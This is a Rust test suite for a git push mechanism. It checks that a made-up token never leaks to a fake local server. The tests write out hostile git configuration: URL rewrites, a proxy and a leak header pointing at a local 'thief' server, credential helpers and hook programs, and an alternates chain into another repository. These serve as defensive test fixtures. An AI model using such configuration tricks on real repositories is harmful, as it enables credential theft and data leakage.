//! The push mechanics (X.27 step 4, PLAN.md T101) against the clone's
//! fake git server on 127.0.0.1 (`git http-backend` behind a few lines of
//! HTTP that ask for a Basic credential): a made-up token, the canary, is
//! searched for wherever it must not be. No real forge, no real token.

use super::*;
use crate::forge_clone::tests::{
    CANARY, Mode, USER, bare, basic, files_with_token, git_in, pids_with, server,
};
use std::path::{Path, PathBuf};

struct Rig {
    _tmp: tempfile::TempDir,
    root: PathBuf,
    staging: PathBuf,
    folder: PathBuf,
    /// The forge's bare repository.
    remote: PathBuf,
    markers: PathBuf,
}

fn rig() -> Rig {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    bare(&root, "o/r", |_| {});
    let staging = root.join("staging");
    let markers = root.join("markers");
    std::fs::create_dir_all(&staging).unwrap();
    std::fs::create_dir_all(&markers).unwrap();
    let folder = root.join("ws/proj");
    std::fs::create_dir_all(folder.parent().unwrap()).unwrap();
    git_in(
        &root,
        &[
            "clone",
            "-q",
            root.join("o/r.git").to_str().unwrap(),
            folder.to_str().unwrap(),
        ],
    );
    let r = Rig {
        remote: root.join("o/r.git"),
        _tmp: tmp,
        root,
        staging,
        folder,
        markers,
    };
    r.commit("second", "agent's work\n");
    r
}

fn bounds() -> Bounds {
    Bounds {
        timeout: Duration::from_secs(60),
        max_copy: 64 * 1024 * 1024,
        max_files: MAX_FILES,
        stage_time: STAGE_TIME,
    }
}

fn token() -> Secret<String> {
    Secret::new(CANARY.into())
}

impl Rig {
    /// A commit in the folder, made with the folder's config ignored as far
    /// as it can be (the test's own git, not the node's).
    fn commit(&self, msg: &str, text: &str) -> String {
        std::fs::write(self.folder.join("work.txt"), text).unwrap();
        self.git(&["add", "-A"]);
        self.git(&["commit", "-q", "-m", msg]);
        self.git(&["rev-parse", "HEAD"])
    }

    fn git(&self, args: &[&str]) -> String {
        let mut a = vec![
            "-c",
            "core.hooksPath=/dev/null",
            "-c",
            "include.path=/dev/null",
            "-c",
            "core.fsmonitor=false",
            "-c",
            "core.commitGraph=false",
        ];
        a.extend_from_slice(args);
        git_in(&self.folder, &a)
    }

    fn remote_ref(&self, branch: &str) -> Option<String> {
        let out = std::process::Command::new("git")
            .args(["--git-dir"])
            .arg(&self.remote)
            .args([
                "rev-parse",
                "--verify",
                "-q",
                &format!("refs/heads/{branch}"),
            ])
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .output()
            .unwrap();
        out.status
            .success()
            .then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
    }

    fn stage(&self) -> Result<Staged, String> {
        stage(&self.staging, &self.folder, "sha1", &bounds())
    }

    async fn push(&self, host: &str, branch: &str, commit: &str) -> Result<Pushed, String> {
        let st = self.stage()?;
        push(
            &st,
            None,
            host,
            "o/r",
            branch,
            commit,
            USER,
            &token(),
            &bounds(),
        )
        .await
    }

    /// A program that records that it ran.
    fn marker(&self, name: &str) -> String {
        let p = self.root.join(format!("mark-{name}.sh"));
        std::fs::write(
            &p,
            format!(
                "#!/bin/sh\necho {name} >> {}/ran\ncat >/dev/null\n",
                self.markers.display()
            ),
        )
        .unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
        p.display().to_string()
    }

    fn ran(&self) -> String {
        std::fs::read_to_string(self.markers.join("ran")).unwrap_or_default()
    }

    fn staging_empty(&self) -> bool {
        std::fs::read_dir(&self.staging).unwrap().next().is_none()
    }
}

fn ask() -> Mode {
    Mode {
        ask: true,
        ..Default::default()
    }
}

/// The plain case: the pinned commit reaches the forge's branch, the token
/// only through the helper, and the node's repository is gone afterwards.
#[tokio::test]
async fn the_pinned_commit_reaches_the_branch() {
    let r = rig();
    let forge = server(&r.root, ask());
    let pin = pin(&r.folder, None).unwrap();
    assert_eq!(pin.branch, "main");
    let p = r.push(&forge.host(), "feature", &pin.commit).await.unwrap();
    assert_eq!(p.flag, '*', "{p:?}");
    assert_eq!(
        r.remote_ref("feature").as_deref(),
        Some(pin.commit.as_str())
    );
    assert!(r.staging_empty(), "the node's repository was not removed");
    assert!(
        forge
            .seen()
            .iter()
            .any(|s| s.auth.as_deref() == Some(basic().as_str())),
        "the credential never reached the forge"
    );
    // Again: up to date, nothing sent.
    let p = r.push(&forge.host(), "feature", &pin.commit).await.unwrap();
    assert_eq!(p.flag, '=', "{p:?}");
}

/// The folder's config, include, hooks and helpers name the thief and
/// marker programs: nothing of them is read or run, the thief gets nothing,
/// and the push goes where the node built the URL for (T19).
#[tokio::test]
async fn nothing_of_the_folders_config_or_hooks_is_read_or_run() {
    let r = rig();
    let forge = server(&r.root, ask());
    let thief = server(&r.root, Mode::default());
    let t = thief.base();
    let inc = r.root.join("inc.cfg");
    std::fs::write(
        &inc,
        format!("[url \"{t}/\"]\n\tinsteadOf = {}/\n", forge.base()),
    )
    .unwrap();
    let hooks = r.folder.join(".git/hooks");
    for h in [
        "pre-push",
        "reference-transaction",
        "post-update",
        "push-to-checkout",
    ] {
        let m = r.marker(h);
        std::fs::copy(&m, hooks.join(h)).unwrap();
    }
    let mut cfg = std::fs::read_to_string(r.folder.join(".git/config")).unwrap();
    cfg.push_str(&format!(
        "[include]\n\tpath = {inc}\n\
         [url \"{t}/\"]\n\tpushInsteadOf = {b}/\n\tinsteadOf = {b}/\n\
         [remote \"origin\"]\n\tpushurl = {t}/o/r.git\n\treceivepack = {rp}\n\
         [http]\n\tproxy = {t}\n\textraHeader = X-Leak: folder\n\tsslVerify = false\n\tfollowRedirects = true\n\
         [credential]\n\thelper = !{ch}\n\
         [core]\n\thooksPath = {hp}\n\tsshCommand = {sc}\n\tgitProxy = {gp}\n\tfsmonitor = {fm}\n\talternateRefsCommand = {ar}\n\
         [push]\n\tpushOption = leak\n\tfollowTags = true\n\trecurseSubmodules = on-demand\n\
         [gpg]\n\tprogram = {gpg}\n",
        inc = inc.display(),
        b = forge.base(),
        rp = r.marker("receivepack"),
        ch = r.marker("credential"),
        hp = hooks.display(),
        sc = r.marker("ssh"),
        gp = r.marker("gitproxy"),
        fm = r.marker("fsmonitor"),
        ar = r.marker("alternaterefs"),
        gpg = r.marker("gpg"),
    ));
    std::fs::write(r.folder.join(".git/config"), cfg).unwrap();
    // A gitlink and a .gitmodules naming the thief: data, nothing runs.
    std::fs::write(
        r.folder.join(".gitmodules"),
        format!("[submodule \"s\"]\n\tpath = s\n\turl = {t}/o/r.git\n"),
    )
    .unwrap();
    r.git(&["add", ".gitmodules"]);
    let other = r.git(&["rev-parse", "HEAD~1"]);
    r.git(&[
        "update-index",
        "--add",
        "--cacheinfo",
        &format!("160000,{other},s"),
    ]);
    r.git(&["commit", "-q", "-m", "gitlink"]);
    let pin = pin(&r.folder, None).unwrap();
    let p = r.push(&forge.host(), "main", &pin.commit).await.unwrap();
    assert_eq!(p.flag, ' ', "{p:?}");
    assert_eq!(r.remote_ref("main").as_deref(), Some(pin.commit.as_str()));
    assert_eq!(r.ran(), "", "a program the folder names ran");
    assert!(thief.seen().is_empty(), "{:?}", thief.seen());
    for s in forge.seen() {
        assert!(!s.head.contains("X-Leak"), "{}", s.head);
        assert!(!s.path.contains("leak"), "{}", s.path);
    }
}

/// An alternates chain the agent wrote into the folder's store, naming
/// another repository on the node: that repository's commit cannot be
/// pushed (the experiment's E2, which pushed it with alternates).
#[tokio::test]
async fn an_alternates_chain_never_reaches_another_repository() {
    let r = rig();
    let forge = server(&r.root, ask());
    let other = r.root.join("other");
    std::fs::create_dir_all(&other).unwrap();
    git_in(&other, &["init", "-q", "-b", "main"]);
    std::fs::write(other.join("secret"), "OTHER-REPO-SECRET-CANARY\n").unwrap();
    git_in(&other, &["add", "-A"]);
    git_in(&other, &["commit", "-q", "-m", "other"]);
    let theirs = git_in(&other, &["rev-parse", "HEAD"]);
    std::fs::write(
        r.folder.join(".git/objects/info/alternates"),
        format!("{}\n", other.join(".git/objects").display()),
    )
    .unwrap();
    // Also as the branch's own ref: what an agent would write.
    std::fs::write(r.folder.join(".git/refs/heads/leak"), format!("{theirs}\n")).unwrap();
    let pin = pin(&r.folder, Some("leak")).unwrap();
    assert_eq!(pin.commit, theirs);
    let st = r.stage().unwrap();
    assert!(subject(&st, &theirs, None).await.is_err());
    let e = r.push(&forge.host(), "leak", &theirs).await.unwrap_err();
    assert!(e.contains("git push failed"), "{e}");
    assert_eq!(r.remote_ref("leak"), None);
    // A loose object file that is a link to the other repository's object
    // is not taken either.
    let (d, f) = theirs.split_at(2);
    std::fs::create_dir_all(r.folder.join(".git/objects").join(d)).unwrap();
    std::os::unix::fs::symlink(
        other.join(".git/objects").join(d).join(f),
        r.folder.join(".git/objects").join(d).join(f),
    )
    .unwrap();
    let st = r.stage().unwrap();
    assert!(!st.repo.join("objects").join(d).join(f).exists());
    assert!(subject(&st, &theirs, None).await.is_err());
}

/// What the node's repository holds: loose objects and pack/idx files of
/// the folder, nothing of `info/` (alternates, http-alternates, the
/// commit-graph), no multi-pack-index, promisor or keep file.
#[tokio::test]
async fn only_loose_objects_and_packs_are_taken() {
    let r = rig();
    let forge = server(&r.root, ask());
    r.git(&["gc", "-q"]);
    let objects = r.folder.join(".git/objects");
    std::fs::write(
        objects.join("info/http-alternates"),
        format!("{}/x\n", forge.base()),
    )
    .unwrap();
    std::fs::write(objects.join("info/commit-graph"), b"junk-graph").unwrap();
    std::fs::write(objects.join("pack/multi-pack-index"), b"junk-midx").unwrap();
    let pack = std::fs::read_dir(objects.join("pack"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .find(|n| n.ends_with(".pack"))
        .unwrap();
    let stem = pack.trim_end_matches(".pack");
    std::fs::write(objects.join(format!("pack/{stem}.promisor")), b"").unwrap();
    std::fs::write(objects.join(format!("pack/{stem}.keep")), b"").unwrap();
    let st = r.stage().unwrap();
    let mut names: Vec<String> = walkdir::WalkDir::new(st.repo.join("objects"))
        .into_iter()
        .flatten()
        .filter(|e| e.file_type().is_file())
        .map(|e| {
            e.path()
                .strip_prefix(&st.repo)
                .unwrap()
                .display()
                .to_string()
        })
        .collect();
    names.sort();
    assert!(
        names.iter().all(|n| (n.starts_with("objects/pack/pack-")
            && (n.ends_with(".pack") || n.ends_with(".idx")))
            || (n.len() == "objects/xx/".len() + 38)),
        "{names:?}"
    );
    assert!(names.iter().any(|n| n.ends_with(".pack")), "{names:?}");
    let pin = pin(&r.folder, None).unwrap();
    drop(st);
    let p = r.push(&forge.host(), "packed", &pin.commit).await.unwrap();
    assert_eq!(p.flag, '*');
}

/// A forge that redirects: not followed; the other host gets nothing.
#[tokio::test]
async fn a_redirect_is_not_followed() {
    let r = rig();
    let thief = server(&r.root, Mode::default());
    for on_post in [false, true] {
        let forge = server(
            &r.root,
            Mode {
                ask: true,
                redirect: Some((302, thief.base(), on_post)),
                ..Default::default()
            },
        );
        let pin = pin(&r.folder, None).unwrap();
        let res = r.push(&forge.host(), "redir", &pin.commit).await;
        assert!(res.is_err(), "{res:?}");
        assert!(!res.unwrap_err().contains(CANARY));
    }
    assert!(thief.seen().is_empty(), "{:?}", thief.seen());
    assert_eq!(r.remote_ref("redir"), None);
}

/// A push the forge refuses (non-fast-forward) is reported as the forge's
/// porcelain line, without git's hints; the forge's branch is unchanged.
#[tokio::test]
async fn a_rejected_push_is_the_forges_answer_without_hints() {
    let r = rig();
    let forge = server(&r.root, ask());
    let first = pin(&r.folder, None).unwrap();
    r.push(&forge.host(), "main", &first.commit).await.unwrap();
    r.git(&["reset", "-q", "--hard", "HEAD~1"]);
    let diverged = r.commit("diverged", "other work\n");
    let p = r.push(&forge.host(), "main", &diverged).await.unwrap();
    assert_eq!(p.flag, '!', "{p:?}");
    assert!(p.summary.contains("rejected"), "{p:?}");
    assert!(!p.summary.contains("hint"), "{p:?}");
    assert_eq!(r.remote_ref("main").as_deref(), Some(first.commit.as_str()));
}

/// (a) A linked object file the agent rewrites after the link: git reads
/// the new bytes, and the forge, which names objects by the hash of what
/// it received and checks that the new ref reaches only objects it has,
/// refuses the push. The forge never gets the pinned id with other content.
#[tokio::test]
async fn a_rewritten_object_only_fails_the_push() {
    let r = rig();
    let forge = server(&r.root, ask());
    let pin = pin(&r.folder, None).unwrap();
    let st = r.stage().unwrap();
    // The commit's tree's blob `work.txt`, rewritten in place (same inode)
    // as a valid loose object of other content.
    let blob = r.git(&["rev-parse", "HEAD:work.txt"]);
    let (d, f) = blob.split_at(2);
    let path = r.folder.join(".git/objects").join(d).join(f);
    let staged_path = st.repo.join("objects").join(d).join(f);
    use std::os::unix::fs::MetadataExt;
    assert_eq!(
        std::fs::metadata(&path).unwrap().ino(),
        std::fs::metadata(&staged_path).unwrap().ino(),
        "linked"
    );
    let forged = {
        let other = r.root.join("forged");
        std::fs::create_dir_all(&other).unwrap();
        git_in(&other, &["init", "-q"]);
        std::fs::write(other.join("x"), "FORGED CONTENT\n").unwrap();
        let id = git_in(&other, &["hash-object", "-w", "x"]);
        let (a, b) = id.split_at(2);
        std::fs::read(other.join(".git/objects").join(a).join(b)).unwrap()
    };
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
    {
        use std::io::Write;
        let mut w = std::fs::OpenOptions::new()
            .write(true)
            .truncate(true)
            .open(&path)
            .unwrap();
        w.write_all(&forged).unwrap();
    }
    let res = push(
        &st,
        None,
        &forge.host(),
        "o/r",
        "rewritten",
        &pin.commit,
        USER,
        &token(),
        &bounds(),
    )
    .await;
    assert!(
        res.is_err() || res.as_ref().is_ok_and(|p| p.flag == '!'),
        "{res:?}"
    );
    assert_eq!(r.remote_ref("rewritten"), None);
    // The forge has no object of that id with the forged content.
    let out = std::process::Command::new("git")
        .arg("--git-dir")
        .arg(&r.remote)
        .args(["cat-file", "-p", &blob])
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .output()
        .unwrap();
    assert!(!String::from_utf8_lossy(&out.stdout).contains("FORGED"));
}

/// (a) Where a link is refused (another owner's files under
/// `fs.protected_hardlinks`, another file system), the objects are copied,
/// with no link followed and within the copy cap; past the cap, a plain
/// sentence and nothing pushed.
#[tokio::test]
async fn refused_links_fall_back_to_a_bounded_copy() {
    let r = rig();
    let forge = server(&r.root, ask());
    let pin = pin(&r.folder, None).unwrap();
    refuse_links(true);
    let st = r.stage().unwrap();
    assert!(
        st.linked == 0 && st.copied > 0,
        "{} {}",
        st.linked,
        st.copied
    );
    let p = push(
        &st,
        None,
        &forge.host(),
        "o/r",
        "copied",
        &pin.commit,
        USER,
        &token(),
        &bounds(),
    )
    .await
    .unwrap();
    assert_eq!(p.flag, '*');
    drop(st);
    let small = Bounds {
        max_copy: 100,
        ..bounds()
    };
    let e = stage(&r.staging, &r.folder, "sha1", &small).err().unwrap();
    assert!(e.contains("clone_max_mb"), "{e}");
    refuse_links(false);
    assert!(r.staging_empty());
}

/// (b) More object files than the cap: a plain sentence before anything is
/// sent, and the node's repository removed.
#[tokio::test]
async fn too_many_object_files_are_refused_plainly() {
    let r = rig();
    let few = Bounds {
        max_files: 2,
        ..bounds()
    };
    let e = stage(&r.staging, &r.folder, "sha1", &few).err().unwrap();
    assert!(e.contains("git gc"), "{e}");
    assert!(r.staging_empty());
}

/// A stalled forge: the push ends at its time limit with its process
/// group, and while it waits no process has the token in its command line
/// or environment (it is only in the pipe).
#[tokio::test]
async fn a_stalled_push_ends_at_its_limit_with_no_token_in_proc() {
    let r = rig();
    let forge = server(
        &r.root,
        Mode {
            stall: true,
            ..Default::default()
        },
    );
    let pin = pin(&r.folder, None).unwrap();
    let st = r.stage().unwrap();
    let short = Bounds {
        timeout: Duration::from_secs(3),
        ..bounds()
    };
    let host = forge.host();
    let looked = tokio::spawn(async move {
        let mut seen = Vec::new();
        for _ in 0..40 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            for pid in pids_with(&host) {
                for f in ["cmdline", "environ"] {
                    if let Ok(b) = std::fs::read(format!("/proc/{pid}/{f}")) {
                        seen.push(String::from_utf8_lossy(&b).to_string());
                    }
                }
            }
        }
        seen
    });
    let e = push(
        &st,
        None,
        &forge.host(),
        "o/r",
        "stall",
        &pin.commit,
        USER,
        &token(),
        &short,
    )
    .await
    .unwrap_err();
    assert!(e.contains("clone_timeout_s"), "{e}");
    let seen = looked.await.unwrap();
    assert!(!seen.is_empty(), "no git process was seen");
    for s in seen {
        assert!(!s.contains(CANARY), "{s}");
    }
    assert_eq!(pids_with(&forge.host()), Vec::<i32>::new());
}

/// What is read before the card: the branch from `HEAD` or by name, from
/// loose refs and `packed-refs`; a detached or unborn `HEAD`, a hostile
/// name and a missing branch are plain sentences.
#[test]
fn pins() {
    let r = rig();
    let head = r.git(&["rev-parse", "HEAD"]);
    assert_eq!(
        pin(&r.folder, None).unwrap(),
        Pin {
            branch: "main".into(),
            commit: head.clone()
        }
    );
    r.git(&["branch", "feature/x"]);
    r.git(&["pack-refs", "--all"]);
    assert_eq!(pin(&r.folder, Some("feature/x")).unwrap().commit, head);
    assert!(
        pin(&r.folder, Some("nope"))
            .unwrap_err()
            .contains("no commit")
    );
    r.git(&["checkout", "-q", "--detach"]);
    assert!(pin(&r.folder, None).unwrap_err().contains("detached"));
    r.git(&["checkout", "-q", "--orphan", "empty"]);
    assert!(pin(&r.folder, None).unwrap_err().contains("no commit"));
    // A `.git` that is a file (a linked worktree) is not read.
    let wt = r.root.join("wt");
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::write(
        wt.join(".git"),
        format!("gitdir: {}\n", r.folder.join(".git").display()),
    )
    .unwrap();
    assert!(pin(&wt, None).is_err());
}

/// git's text loses terminal escapes, the token in every form and hints.
#[test]
fn gits_text_is_cleaned() {
    use base64::Engine as _;
    let b64 = base64::engine::general_purpose::STANDARD.encode(format!("{USER}:{CANARY}"));
    let raw = format!(
        "\u{1b}[31merror\u{1b}[0m: {CANARY} at https://{USER}:{CANARY}@h/x\n\
         hint: use git pull\nremote: {b64}\n\u{1b}]0;title\u{7}tail"
    );
    let t = clean_text(&raw, USER, &token());
    assert!(!t.contains(CANARY) && !t.contains(&b64), "{t}");
    assert!(!t.contains('\u{1b}') && !t.contains("hint:"), "{t}");
    assert!(t.contains("error") && t.contains("tail"), "{t}");
    let l = last_lines(&format!("a\n\nb\nc\nd\u{202e}e\n{}", "x".repeat(1000)));
    assert!(l.chars().count() <= crate::forge_clone::ERROR_MAX && !l.contains('\u{202e}'));
}

/// Nothing the push leaves holds the token: no file under the test's tree
/// (the forge's own repository aside, which never stores it either).
#[tokio::test]
async fn no_file_holds_the_token() {
    let r = rig();
    let forge = server(&r.root, ask());
    let pin = pin(&r.folder, None).unwrap();
    r.push(&forge.host(), "t", &pin.commit).await.unwrap();
    assert_eq!(files_with_token(&r.root), Vec::<PathBuf>::new());
    let _ = Path::new("");
}
